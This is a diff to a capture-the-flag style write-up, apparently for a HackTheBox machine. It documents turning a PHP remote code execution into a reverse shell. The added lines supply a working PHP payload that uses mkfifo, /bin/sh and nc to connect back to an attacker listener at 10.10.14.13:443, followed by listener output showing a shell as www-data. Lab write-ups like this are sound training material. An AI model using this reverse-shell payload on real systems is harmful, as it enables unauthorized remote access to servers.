@@ -415,11 +415,20 @@ PHP Payload -> `<?php phpinfo(); ?>`
 
 <br />
 
-Now that we have verified the rce, we proceed to establish a Reverse Shell to gain access to the System:
+Now that we have verified the `rce`, we proceed to establish a `Reverse Shell` to gain access to the System as `www-data`:
+
+PHP Payload -> `<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f'); ?>`
 
 <br />
 
-PHP Payload -> `<?php system(''); ?>`
 
+```bash
+❯ nc -nlvp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.10.102] 56934
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-
+<br />
